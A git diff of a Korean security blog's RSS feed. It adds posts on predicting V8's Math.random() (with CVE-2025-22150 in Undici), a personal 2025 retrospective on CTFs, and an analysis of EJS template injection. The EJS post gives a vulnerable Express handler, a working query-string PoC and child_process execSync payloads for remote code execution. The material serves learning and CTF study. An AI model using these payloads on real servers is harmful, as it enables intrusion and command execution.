@@ -1,26 +1,126 @@
-<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>nullbyte</title><description>My Blog</description><link>https://itznullbyte.github.io/</link><language>en</language><item><title>2025년을 되돌아보며</title><link>https://itznullbyte.github.io/posts/about_2025/</link><guid isPermaLink="true">https://itznullbyte.github.io/posts/about_2025/</guid><description> </description><pubDate>Sat, 13 Dec 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h3&gt;About 2025&lt;/h3&gt;
-&lt;p&gt;2025년도 보안 공부와 학업에 대해 되돌아보며 글을 써보겠다.&lt;/p&gt;
-&lt;p&gt;전체적으로 부족한게 많았던 한 해였고 아쉬운점이 정말 많았다.
-일단 보안을 시작하면서 성적이 꽤 많이 떨어졌다. 1학년 때 보다 내신 평균이 1점정도 떨어졌고 수시로 인서울은 바라기 어려운 상황이 되었다. 대부분 학생 때 보안을 하면서 꽤나 이름을 날리는 사람들은 특기자로 가기에 너도 그 정도 스펙이면 특기자 쓰면 되는거 아님? 이라고 나에게 묻는 사람들이 꽤 있다.&lt;/p&gt;
-&lt;p&gt;일단 나는 다른 사람들에 비해 특기자로써의 경쟁력이 낮다. 23년 12월에 본격적으로 보안을 시작한 이후로 보이는 모든 대회에 다 나갔고, 실력좋은 세명컴고 2, 3학년들과 함께한 덕에 큰 어려움없이 본선까지 가며 닉네임을 알리기 시작했다. 그러나 본선만 가면 웹문제를 0솔브하기 일쑤였고, 작은 대회들에서도 한두 등수차이로 수상을 실패하며 현시점으로 특기증빙서류에 넣을 그렇다 할 상장이 없다.&lt;/p&gt;
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>nullbyte</title><description>My Blog</description><link>https://itznullbyte.github.io/</link><language>en</language><item><title>About Math.random()</title><link>https://itznullbyte.github.io/posts/math_random/</link><guid isPermaLink="true">https://itznullbyte.github.io/posts/math_random/</guid><description> </description><pubDate>Fri, 09 Jan 2026 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;About&lt;/h2&gt;
+&lt;p&gt;CTF에서 &lt;code&gt;Math.random()&lt;/code&gt;을 예측하는 문제가 꽤 나오길래 분석해 보기로 했습니다.&lt;/p&gt;
+&lt;h2&gt;Math.random()&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&quot;./mozilla.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
+&lt;code&gt;mdn&lt;/code&gt; 공식 문서에서 &lt;code&gt;Math.random()&lt;/code&gt;을 설명할 때 암호학적으로 안전한 난수를 제공하지 않으니 보안에 유의할 것을 언급합니다.&lt;br /&gt;
+이 글에서는 &lt;code&gt;Math.random()&lt;/code&gt;을 예측하는 방법과 원리에 대해 다룹니다.&lt;/p&gt;
+&lt;h2&gt;About Math random&lt;/h2&gt;
+&lt;p&gt;&lt;code&gt;Math.random()&lt;/code&gt;이 생성하는 값은 &lt;strong&gt;True Random&lt;/strong&gt; 값이 아닙니다. 해당 함수는 &lt;strong&gt;Pseudo Random Number Generator (PRNG)&lt;/strong&gt; 이기 때문입니다. PRNG의 특징은 다음과 같습니다.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;초기에 지정된 Seed 값을 재사용한다.&lt;/li&gt;
+&lt;li&gt;유한한 상태를 가지고 있기에 언젠가는 이미 생성되었던 숫자 시퀀스를 반복한다.&lt;/li&gt;
+&lt;li&gt;알고리즘 기반으로 동작하기에 계산 효율적이다.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;내부적으로 PRNG의 구조는 다음과 같이 표현할 수 있습니다.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;state = 0x12345678
+
+output = g(state)
+
+return output
+
+state = f(state)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;내부의 상태 &lt;code&gt;state&lt;/code&gt;와 난수 생성 함수 &lt;code&gt;g&lt;/code&gt;, &lt;code&gt;state&lt;/code&gt;를 갱신하기 위한 함수 &lt;code&gt;f&lt;/code&gt;가 존재합니다.&lt;br /&gt;
+유저가 output을 여러 개 수집하고 &lt;code&gt;g()&lt;/code&gt;, &lt;code&gt;f()&lt;/code&gt;의 구조를 알고 있다면 &lt;code&gt;state&lt;/code&gt;를 역산할 수 있게 됩니다.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;state&lt;/code&gt;를 알게 된다면 아래와 같이 다음 output을 예측할 수 있습니다.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;next_output = g(f(state))
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2&gt;V8 Analysis&lt;/h2&gt;
+&lt;p&gt;ECMAScript는 &lt;code&gt;Math.random()&lt;/code&gt; 구현의 표준을 명시하지 않습니다.&lt;br /&gt;
+즉, 엔진에 따라서 자체적인 &lt;code&gt;PRNG&lt;/code&gt;를 구현해 사용합니다. 가장 많이 사용되는 V8의 경우에는 xorshift128+라는 알고리즘을 기반으로 한 &lt;code&gt;Math.random()&lt;/code&gt;을 사용합니다.&lt;/p&gt;
+&lt;p&gt;아래는 Chromium에 포함된 V8 math-random 구현체 소스 코드입니다.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;void MathRandom::InitializeContext(Isolate* isolate, Handle&amp;lt;Context&amp;gt; native_context) {
+  Handle&amp;lt;FixedDoubleArray&amp;gt; cache = Handle&amp;lt;FixedDoubleArray&amp;gt;::cast(isolate-&amp;gt;factory()-&amp;gt;NewFixedDoubleArray(kCacheSize, TENURED));
+  for (int i = 0; i &amp;lt; kCacheSize; i++) cache-&amp;gt;set(i, 0);
+  native_context-&amp;gt;set_math_random_cache(*cache);
+  Handle&amp;lt;PodArray&amp;lt;State&amp;gt;&amp;gt; pod = PodArray&amp;lt;State&amp;gt;::New(isolate, 1, TENURED);
+  native_context-&amp;gt;set_math_random_state(*pod);
+  ResetContext(*native_context);
+}
+void MathRandom::ResetContext(Context* native_context) {
+  native_context-&amp;gt;set_math_random_index(Smi::zero());
+  State state = {0, 0};
+  PodArray&amp;lt;State&amp;gt;::cast(native_context-&amp;gt;math_random_state())-&amp;gt;set(0, state);
+}
+Address MathRandom::RefillCache(Isolate* isolate, Context* native_context) {
+  DisallowHeapAllocation no_gc;
+  PodArray&amp;lt;State&amp;gt;* pod = PodArray&amp;lt;State&amp;gt;::cast(native_context-&amp;gt;math_random_state());
+  State state = pod-&amp;gt;get(0);
+  // Initialize state if not yet initialized. If a fixed random seed was
+  // requested, use it to reset our state the first time a script asks for
+  // random numbers in this context. This ensures the script sees a consistent
+  // sequence.
+  if (state.s0 == 0 &amp;amp;&amp;amp; state.s1 == 0) {
+    uint64_t seed;
+    if (FLAG_random_seed != 0) {
+      seed = FLAG_random_seed;
+    } else {
+      isolate-&amp;gt;random_number_generator()-&amp;gt;NextBytes(&amp;amp;seed, sizeof(seed));
+    }
+    state.s0 = base::RandomNumberGenerator::MurmurHash3(seed);
+    state.s1 = base::RandomNumberGenerator::MurmurHash3(~seed);
+    CHECK(state.s0 != 0 || state.s1 != 0);
+  }
+  FixedDoubleArray* cache = FixedDoubleArray::cast(native_context-&amp;gt;math_random_cache());
+  // Create random numbers.
+  for (int i = 0; i &amp;lt; kCacheSize; i++) {
+    // Generate random numbers using xorshift128+.
+    base::RandomNumberGenerator::XorShift128(&amp;amp;state.s0, &amp;amp;state.s1);
+    cache-&amp;gt;set(i, base::RandomNumberGenerator::ToDouble(state.s0));
+  }
+  pod-&amp;gt;set(0, state);
+  Smi new_index = Smi::FromInt(kCacheSize);
+  native_context-&amp;gt;set_math_random_index(new_index);
+  return new_index.ptr();
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;64비트 정수 2개(s0, s1)로 128비트 state를 구현합니다.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;if (state.s0 == 0 &amp;amp;&amp;amp; state.s1 == 0) {
+  uint64_t seed;
+  if (FLAG_random_seed != 0) {
+    seed = FLAG_random_seed;
+  } else {
+    isolate-&amp;gt;random_number_generator()-&amp;gt;NextBytes(&amp;amp;seed, sizeof(seed));
+  }
+  state.s0 = base::RandomNumberGenerator::MurmurHash3(seed);
+  state.s1 = base::RandomNumberGenerator::MurmurHash3(~seed);
+  CHECK(state.s0 != 0 || state.s1 != 0);
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Random seed가 설정되어 있지 않다면 OS 엔트로피 기반으로 seed를 생성하고 MurmurHash3로 섞어 s0, s1을 할당합니다.
+이를 기반으로 여러 개의 난수(kCacheSize)를 미리 생성해 놓고 Math.random() 호출 시마다 캐시에서 하나씩 꺼내 사용합니다.&lt;/p&gt;
+&lt;p&gt;구조가 단순하고 당연하게도 seed를 initialize 하는 부분이 없기에 충분히 미래의 값을 알아내는 스크립트를 작성할 수 있습니다.
+이를 구현한 대표적인 라이브러리가 &lt;a href=&quot;https://github.com/PwnFunction/v8-randomness-predictor&quot;&gt;V8 Random Predictor&lt;/a&gt;입니다.&lt;/p&gt;
+&lt;h2&gt;Case Analysis CVE-2025-22150&lt;/h2&gt;
+&lt;p&gt;m0lecon의 securetextbin 문제에서 &lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2025-22150&quot;&gt;CVE-2025-22150&lt;/a&gt;를 사용한 문제가 출제되었습니다.&lt;/p&gt;
+&lt;p&gt;HTTP/1.1 클라이언트인 Undici 라이브러리에서 multipart boundary를 생성할 때 Math.random()을 사용했기에, 이를 예측하고 multipart/form-data를 smuggling 할 수 있었습니다.
+이를 통해 공격자는 boundary 값을 예측하거나 요청을 변조할 수 있습니다.&lt;/p&gt;
+&lt;p&gt;다음과 같이 crypto.randomInt()를 사용하도록 수정되었습니다.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./commit.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+</content:encoded></item><item><title>2025년 망함</title><link>https://itznullbyte.github.io/posts/about_2025/</link><guid isPermaLink="true">https://itznullbyte.github.io/posts/about_2025/</guid><description> </description><pubDate>Sun, 04 Jan 2026 00:00:00 GMT</pubDate><content:encoded>&lt;h3&gt;About 2025&lt;/h3&gt;
+&lt;p&gt;2025년 개망했다. 한 게 없다.&lt;/p&gt;
+&lt;p&gt;아쉬운점이 정말 많았다.
+일단 보안을 시작하면서 성적이 꽤 많이 떨어졌다. 1학년 때 보다 내신 평균이 1점정도 떨어졌고 수시로 인서울은 바라기 어려운 상황이 되었다.&lt;/p&gt;
+&lt;p&gt;또한 다른 사람들에 비해 특기자로써의 경쟁력도 낮다. 23년 12월에 본격적으로 보안을 시작한 이후로 보이는 모든 대회에 다 나갔고, 실력좋은 세명컴고 2, 3학년들과 함께한 덕에 큰 어려움없이 본선까지 가며 닉네임을 알리기 시작했다. 그러나 본선만 가면 웹문제를 0솔브하기 일쑤였고, 작은 대회들에서도 한두 등수차이로 수상을 실패하며 특기증빙서류에 넣을 그렇다 할 상장이 없다.&lt;/p&gt;
 &lt;p&gt;버그바운티 실적을 꽤 쌓은건 있지만 대부분 버그바운티는 인증서류를 발급해주지 않는지라 역시 증빙서류에 넣긴 어렵다. NASA는 LoR이라고 감사장을 주길래 이거라도 받아보려고 요즘 나사 버그바운티에 도전하고 있다.&lt;/p&gt;
 &lt;h3&gt;보안 입문?&lt;/h3&gt;
-&lt;p&gt;이제 막 보안을 시작하는 중고등학생들에게 이런말을 해주고 싶다.&lt;br /&gt;
-&lt;strong&gt;해킹 공부하기로 마음먹었으면 무조건 화햇스쿨 또는 영재원부터 들어가라&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;보안은 24년 12월 달에 드림핵에서 웹해킹 문제를 풀기 시작하며 입문했다.&lt;/p&gt;
+&lt;p&gt;이때 딱 서울여대 영재원을 들어갔으면 완벽했는데 안들어간게 진짜 한이다.&lt;/p&gt;
 &lt;p&gt;메이저 대회들에 비해 화햇스쿨과 영재원 정보보안 경진대회는 수상하기 상당히 쉬운편에 속한다. 또한 이 상들은 대학들이 꽤 봐주는 상이다. 난 이번년도에 보안을 시작했기에 영재원에서 상을 받고 대학에 넣을 수가 없는 상황이다. 다음년도에 영재원 들어가봤자 대학 원서 마감이 끝난 후 경진대회가 있기에.. 상을 넣을 수가 없다.&lt;/p&gt;
 &lt;p&gt;메이저 대회들도 마찬가지다. 코드게이트를 제외한 Whitehat Contest, CCE, WACON(요즘 안열리긴 함) 들은 전부 원서 마감기간에 아슬아슬하게 걸쳐있거나 그 이후에 열린다. 즉 입시시즌 전 년도인 고2때 수상해놓는게 아니면 원서에 넣을 수 없다.&lt;/p&gt;
+&lt;p&gt;모르겠다 화햇스쿨이라도 빨리 열리면 좋겠다.&lt;/p&gt;
 &lt;h3&gt;성취&lt;/h3&gt;
-&lt;p&gt;이룬것도 어느정도 있다.&lt;/p&gt;
-&lt;p&gt;첫번째로는 인맥이 꽤 생겼다. 디미고 세명컴고분들과 대회를 나가다보니 친한 사람들이 생기기 시작했고 편하게 팀을 이루고 궁금한걸 물어보고 답변받을 수 있는 사이가 되었다.&lt;/p&gt;
-&lt;p&gt;두번째로는 팀이다. 내가 속한 팀으로는 버그바운티 팀 버그줍줍단과, CTF 팀 Fermion이 있다. 버그바운티 팀에서는 리얼월드 취분 고수분들과 케이스 스터디를 할 수 있었고 버그바운티하며 번아웃이 오지 않게 동기를 부여받을 수 있었다. 덕분에 Patchday에 몇건의 취약점을 제보할 수 있었고 25년 카카오 버그바운티는 2등이라는 높은 순위를 기록할 정도로 꾸준히 리얼월드 분석에 참여할 수 있었다.&lt;/p&gt;
+&lt;p&gt;인맥이 꽤 생겼다. 디미고 세명컴고분들과 대회를 나가다보니 친한 사람들이 생기기 시작했고 편하게 팀을 이루고 궁금한걸 물어보고 답변받을 수 있는 사이가 되었다.&lt;/p&gt;
+&lt;p&gt;같이 공부할 팀도 있으면 좋겠다고 생각했는데 들어갔다. 내가 속한 팀으로는 버그바운티 팀 버그줍줍단과, CTF 팀 Fermion이 있다. 버그바운티 팀에서는 리얼월드 취분 고수분들과 케이스 스터디를 할 수 있었고 버그바운티하며 번아웃이 오지 않게 동기를 부여받을 수 있었다. 덕분에 Patchday에 몇건의 취약점을 제보할 수 있었고 25년 카카오 버그바운티는 2등이라는 높은 순위를 기록할 정도로 꾸준히 리얼월드 분석에 참여할 수 있었다.&lt;/p&gt;
 &lt;p&gt;CTF 팀은 Fermion에 들어갔다. 티오리에서 팀을 만든다길래 바로 신청서를 넣었고 운좋게도 알파로 들어갈 수 있었다. 내가 알파팀에 들어갈 실력이 되는지는 모르겠다. 팀원들은 대부분 포스텍, 고려대, 디미고 고수들 등으로 이루어져있었고 해외 CTF를 팀원분들과 뛰어보면 내가 한 문제를 온전히 풀어 플래그를 따는 경우는 거의 없었다.
-평균적으로 한 CTF 당 한 문제 &lt;strong&gt;기여&lt;/strong&gt; 정도가 최대였던거 같다. 풀지 못하더라도 계속 웹을 잡아보고 팀에 조금이라도 보탬이 된다는거에 의의를 갖고 계속 참여하며 실력을 키워나갈것이다.&lt;/p&gt;
-&lt;p&gt;워게임도 7, 8레벨을 반나절에서 하루정도 투자해 풀 수 있게 되었다. 얼마전까지만 해도 5레벨을 며칠동안이나 잡고 겨우겨우 풀었던거 같은데 이제 1시간 컷을 낼 수 있는 실력이 되었다.&lt;/p&gt;
+평균적으로 한 CTF 당 한 문제 &lt;strong&gt;기여&lt;/strong&gt; 정도가 최대였던거 같다.&lt;/p&gt;
+&lt;p&gt;열심히 하면 언젠간 늘지 않을까요..?&lt;/p&gt;
+&lt;p&gt;워게임은 7, 8레벨을 반나절에서 하루정도 투자해 풀 수 있게 되었다. 얼마전까지만 해도 5레벨을 며칠동안이나 잡고 겨우겨우 풀었던거 같은데 이제 1시간 컷을 낼 수 있는 실력이 되었다.&lt;/p&gt;
 &lt;h3&gt;앞으로의 목표&lt;/h3&gt;
 &lt;p&gt;일단 이제 고3이기에 대학이 먼저다. 07년생들이 빠지면 26년도 청소년부가 널널해지긴하겠지만 수상 실적을 빵빵하게 채워서 특기자로 대학을 가는데에 모든걸 걸기엔 무리가 있다.
 특기자도 어느정도 바라보되, 겨울방학엔 수능공부도 적당히 병행할 예정이다.&lt;/p&gt;
-&lt;p&gt;CTF 측면에서도 생각해본건, 나는 내 생각보다도 더 못한다. 보여줄만한 실적이라곤 버그바운티 몇 개와 Finalist 경력뿐, 심지어 본선에서 솔버가 거의 없는 웹을 익스한 경험은 적다.
-이번에 화햇콘 직전에 이대론 안되겠다 싶어서 3주간 인터넷에 있는 CTF writeup 약 200개를 정독하고 이해했다. 그러나 이 지식들을 완전히 내것으로 만들었는지는 모르겠다.
+&lt;p&gt;그리고 CTF Writeup들을 꾸준히 읽을거다.
+이번에 화햇콘 직전에 이대론 안되겠다 싶어서 3주간 인터넷에 있는 CTF writeup 약 200개를 정독하고 이해했다. 이 지식들을 완전히 내 것으로 만들었는지는 모르겠기에 문제파일 받아가며 업솔빙 해볼거다.
 writeup은 시간날때마다 계속 읽을거고 드림핵도 고레벨 위주로 솔브하면서 성장할거다. 적어도 팀원들에게 민폐는 되기 싫다.&lt;/p&gt;
 &lt;p&gt;사실 어려운 문제 솔브에 대해서는 뭐가 문제일지 아직 모르겠다. 본선만 가면 긴장을 해서 그런걸까, 풀 능력이 있는 문제에서도 예상치도 못한 실수를 한다.
 CCE Final - 철도관제센터 문제에서는 &lt;code&gt;password&lt;/code&gt;를 &lt;code&gt;pasword&lt;/code&gt;로 오타내어 청소년부 솔버가 1명 나온 블랙박스 문제를 아쉽게 못풀었다.
@@ -28,10 +128,68 @@ LG Uplus final에서도 csrf token 우회와 csp bypass 방향까지 맞았지�
 이것들도 다 실력 이슈겠지만 너무 아쉬운건 사실이다.&lt;/p&gt;
 &lt;p&gt;다른 분야도 추가로 공부해볼까 생각도 했었다. 대부분의 CTF가 팀으로 전환되어 개인의 분야 다양성이 예전처럼 요구되지는 않지만 YISF나 코드게이트처럼 여전히 개인전인 대회에서는 웹 원툴이 뒤쳐질 수 밖에 없기 때문이다. 하지만 내가 지금부터 시작해서 GPT 이상으로 리버싱이나 암호학을 잘할 수 있을거라고 생각하지 않는다. 웹해킹을 더 깊게 파서 실력을 올리는거에 초점을 맞추는게 더 중요할거라 생각한다. 포너블은 워게임 1, 2레벨 풀 수 있는정도로는 공부해놓을거다.
 대회에서 제일 어려운 웹 문제들은 다 크로미움 분석을 요구하던데 크로미움 소스코드 읽는 능력도 길러놓을거다.&lt;/p&gt;
-&lt;p&gt;다음 대회부턴 웹 능력껏 풀고 수상할거다. 무조건.&lt;/p&gt;
+&lt;p&gt;다음 대회부턴 웹 능력껏 풀고 수상할거다. 코게 주니어부랑 닷핵 본선 꼭 가보고 싶다.&lt;/p&gt;
 &lt;p&gt;아래는 공부하면서 읽은 블로그랑 정리, 업솔때릴거 계획했던거다.
-궁금한건 편하게 &lt;a href=&quot;https://blog.xss.kr/about&quot;&gt;디스코드&lt;/a&gt;로 연락주길 바란다.
+궁금한건 편하게 &lt;a href=&quot;https://blog.xss.kr/about&quot;&gt;디스코드&lt;/a&gt;로 연락주세요 :)
 &lt;img src=&quot;./work.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+</content:encoded></item><item><title>EJS 뒷북치기</title><link>https://itznullbyte.github.io/posts/ejs/</link><guid isPermaLink="true">https://itznullbyte.github.io/posts/ejs/</guid><description> </description><pubDate>Sun, 28 Dec 2025 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;웹해킹하는 사람이라면 EJS SSTI 트릭에 대해 한 번쯤 들어봤을 것이다.
+25년 초반에 EJS 모듈 한 번 분석하고 CTF에서 유용하게 쓰려고 묵혀놓고 있었는데 상당히 웰노운 기법이 되어버려서 분석글을 풀어보려한다.&lt;/p&gt;
+&lt;h3&gt;About EJS&lt;/h3&gt;
+&lt;p&gt;EJS(Embedded JavaScript Templates)는 Node.js 환경에서 웹을 구축할 때 보편적으로 사용되는 템플릿 엔진 중 하나이다. EJS는 HTML 문서 내에서 JavaScript 코드를 삽입하고 실행할 수 있도록 지원하는 템플릿 엔진으로, 동적인 웹 페이지를 쉽게 구성할 수 있는 장점이 있다. 그러나 이러한 유연성은 잘못된 사용 방식에 의해 보안 취약점을 초래할 위험성을 내재하고 있다. EJS 개발자들은 사용자의 입력을 확인하지 않고 render 메소드를 실행해서는 안 된다고 경고한다. 따라서 개발자가 적절한 검증 없이 사용자 입력을 받아 render 함수를 호출하면 원격 코드 실행(RCE, Remote Code Execution) 취약점이 발생할 수 있다. 이는 공격자가 악의적인 JavaScript 코드를 삽입하여 서버 측에서 실행되도록 유도할 수 있음을 의미한다.&lt;/p&gt;
+&lt;p&gt;아래는 취약한 코드의 예시이다.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;app.get(&apos;/&apos;, (req, res) =&amp;gt; {
+  res.render(&apos;index&apos;, req.query);
+});
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;req.query 값을 그대로 &lt;code&gt;res.render()&lt;/code&gt;의 2번째 인자로 넣어서 실행하는 모습이다.&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h3&gt;EJS Analysis&lt;/h3&gt;
+&lt;p&gt;EJS 모듈 내부 로직을 필요한 부분만 보면, &lt;code&gt;render()&lt;/code&gt;에 전달된 인자 중 첫번째 객체가 &lt;code&gt;data&lt;/code&gt;로 잡힌다.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;if (args.length) {
+  data = args.shift();
+  // ...
+  if (data.settings) {
+    // ...
+    viewOpts = data.settings[&apos;view options&apos;];
+    if (viewOpts) {
+      utils.shallowCopy(opts, viewOpts);
+    }
+  }
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;여기서 포인트는 &lt;code&gt;data.settings[&apos;view options&apos;]&lt;/code&gt;가 존재한다면, 그 값을 opts로 shallow copy 한다는거다.&lt;/p&gt;
+&lt;p&gt;그래서 opts에 영향을 주는 값들이 data를 통해 오염될 수 있다.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;function Template(text, optsParam) {
+  var opts = utils.hasOwnOnlyObject(optsParam);
+  var options = utils.createNullProtoObjWherePossible();
+  // ...
+  options.client = opts.client || false;
+  options.escapeFunction = opts.escape || opts.escapeFunction || utils.escapeXML;
+  // ...
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;var escapeFn = opts.escapeFunction;
+
+if (opts.client) {
+  src = &apos;escapeFn = escapeFn || &apos; + escapeFn.toString() + &apos;;\n&apos; + src;
+  if (opts.compileDebug) {
+    src = &apos;rethrow = rethrow || &apos; + rethrow.toString() + &apos;;\n&apos; + src;
+  }
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;code&gt;opts.client&lt;/code&gt;가 true라면 src에 escapeFn을 담아 실행한다.&lt;/p&gt;
+&lt;p&gt;공격자가 &lt;code&gt;view options&lt;/code&gt;을 통해 client를 true로 만들고, 동시에 escapeFunction 또한 오염시킨다면 RCE가 가능하다.&lt;/p&gt;
+&lt;p&gt;과거 버전 PoC를 찾아보면 client를 건드리지 않아도 공격이 성립하지만, 최신버전에서는 client까지 오염시켜야한다.&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h3&gt;PoC (3.1.10)&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;/?settings[view options][client]=1&amp;amp;settings[view options][escapeFunction]=console.log(1);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;완벽한 RCE를 구성하기 위해선 nodejs 기본 모듈인 child process를 require 해와야한다.&lt;/p&gt;
+&lt;p&gt;그러나 그냥 require을 사용하면 not defined라고 떠버리기에 아래와 같은 방법들을 사용할 수 있다.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;globalThis.process.mainModule.require(&apos;child_process&apos;).execSync(&apos;id&apos;);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;(async () =&amp;gt; { try { (await import(&apos;child_process&apos;)).execSync(&apos;id&apos;); } catch {} })();
+&lt;/code&gt;&lt;/pre&gt;
 </content:encoded></item><item><title>Whitehat Contest Final Write-Up</title><link>https://itznullbyte.github.io/posts/2025_withcon_final/</link><guid isPermaLink="true">https://itznullbyte.github.io/posts/2025_withcon_final/</guid><description> </description><pubDate>Sat, 22 Nov 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;TL;DR&lt;/h2&gt;
 &lt;p&gt;화햇콘 본선에 갔다왔는데 웹이 생각보다 잘 안 풀렸네요..&lt;/p&gt;
 &lt;h2&gt;Lemo (Web)&lt;/h2&gt;
